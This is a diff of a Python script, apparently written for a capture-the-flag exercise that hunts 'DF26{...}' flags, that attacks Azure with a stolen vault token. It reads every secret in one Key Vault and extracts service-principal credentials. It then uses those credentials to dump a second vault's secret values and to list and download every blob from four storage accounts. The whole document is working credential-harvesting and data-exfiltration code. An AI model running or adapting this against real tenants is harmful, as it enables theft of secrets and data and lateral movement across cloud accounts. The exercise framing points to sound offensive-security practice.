@@ -8,45 +8,50 @@ export VT
 python3 - <<'PY'
 import os,json,urllib.request,urllib.parse,re
 VT=os.environ["VT"]; TID="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
-V="https://kv-tbl-prod-x3euoz.vault.azure.net"
-def vg(u): return json.load(urllib.request.urlopen(urllib.request.Request(u,headers={"Authorization":"Bearer "+VT}),timeout=25))
-sps=[]
-for s in vg(V+"/secrets?api-version=7.4")["value"]:
-    try:
-        j=json.loads(vg(s["id"]+"?api-version=7.4")["value"]); sps.append((s["id"].rsplit("/",1)[-1],j["appId"],j["clientSecret"]))
-    except: pass
+def req(u,t,hdr=None):
+    h={"Authorization":"Bearer "+t}
+    if hdr:h.update(hdr)
+    try:return urllib.request.urlopen(urllib.request.Request(u,headers=h),timeout=25).read().decode()
+    except Exception as e:
+        try:return e.read().decode()[:160]
+        except:return str(e)
 def tok(c,x,sc):
     d=urllib.parse.urlencode({"client_id":c,"client_secret":x,"grant_type":"client_credentials","scope":sc}).encode()
-    try: return json.load(urllib.request.urlopen(f"https://login.microsoftonline.com/{TID}/oauth2/v2.0/token",d,timeout=20)).get("access_token")
-    except: return None
-def g(u,t):
-    try: return urllib.request.urlopen(urllib.request.Request(u,headers={"Authorization":"Bearer "+t}),timeout=25).read().decode()
-    except Exception as e:
-        try: return e.read().decode()[:300]
-        except: return str(e)
+    try:return json.load(urllib.request.urlopen(f"https://login.microsoftonline.com/{TID}/oauth2/v2.0/token",d,timeout=20)).get("access_token")
+    except:return None
 def hit(tag,s):
-    for m in set(re.findall(r'DF26\{[^}]*\}',s)): print("  !!!FLAG",tag,":"," ".join(m))
+    for m in set(re.findall(r'DF26\{[^}]*\}',s)):print("  !!!FLAG",tag,":"," ".join(m))
+PV="https://kv-tbl-prod-x3euoz.vault.azure.net"
+sps=[]
+for s in json.loads(req(PV+"/secrets?api-version=7.4",VT))["value"]:
+    try:
+        j=json.loads(json.loads(req(s["id"]+"?api-version=7.4",VT))["value"]);sps.append((s["id"].rsplit("/",1)[-1],j["appId"],j["clientSecret"]))
+    except:pass
+XV="2021-08-06"
+ACCTS=["sttblappcfgprodx3euoz","sttblbackupprodx3euoz","sttblarchiveprodx3euoz","sttblcilogsprodx3euoz"]
+SEC="https://kv-tbl-sec-x3euoz.vault.azure.net"
 for name,cid,sec in sps:
-    print("===",name,cid)
-    at=tok(cid,sec,"https://management.azure.com/.default")
-    if at:
-        subs=g("https://management.azure.com/subscriptions?api-version=2022-12-01",at); hit("subs",subs)
-        try: sids=[s["subscriptionId"] for s in json.loads(subs).get("value",[])]
-        except: sids=[]
-        print("  subs:",sids)
-        for sid in sids:
-            r=g(f"https://management.azure.com/subscriptions/{sid}/resources?api-version=2021-04-01&$expand=tags",at); hit("res",r)
+    print("===",name)
+    vt=tok(cid,sec,"https://vault.azure.net/.default")
+    if vt:
+        r=req(SEC+"/secrets?api-version=7.4",vt)
+        if '"value"' in r:
             try:
-                for x in json.loads(r).get("value",[]):
-                    if x.get("tags"): print("   ",x.get("type"),x.get("name"),x.get("tags"))
-            except: pass
-    gt=tok(cid,sec,"https://graph.microsoft.com/.default")
-    if gt:
-        for ep in ["applications?$select=displayName,notes,appId,tags","users?$select=displayName,userPrincipalName,jobTitle","groups?$select=displayName,description"]:
-            hit("graph "+ep.split("?")[0], g("https://graph.microsoft.com/v1.0/"+ep,gt))
+                for s in json.loads(r)["value"]:
+                    val=req(s["id"]+"?api-version=7.4",vt);nm=s["id"].rsplit("/",1)[-1]
+                    v=json.loads(val).get("value","");print("  SEC",nm,"=", " ".join(v));hit("sec:"+nm,val)
+            except Exception as e:print("  sec parse",e,r[:120])
+        else:print("  sec vault:",r[:100])
     st=tok(cid,sec,"https://storage.azure.com/.default")
     if st:
-        for a in ["sttblbackupprodx3euoz","sttblarchiveprodx3euoz"]:
-            lc=g(f"https://{a}.blob.core.windows.net/?comp=list&include=metadata",st); print("  stor",a,lc[:140]); hit("stor",lc)
-print("== enum done ==")
+        for a in ACCTS:
+            b=f"https://{a}.blob.core.windows.net"
+            conts=re.findall(r'<Name>([^<]+)</Name>',req(b+"/?comp=list",st,{"x-ms-version":XV}))
+            if conts:print("  stor",a,conts)
+            for c in conts:
+                for blob in re.findall(r'<Name>([^<]+)</Name>',req(b+f"/{c}?restype=container&comp=list",st,{"x-ms-version":XV})):
+                    data=req(b+f"/{c}/{urllib.parse.quote(blob)}",st,{"x-ms-version":XV})
+                    hit(f"{a}/{c}/{blob}",data)
+                    if len(data)<400:print(f"    {a}/{c}/{blob}:",data[:300])
+print("== done ==")
 PY
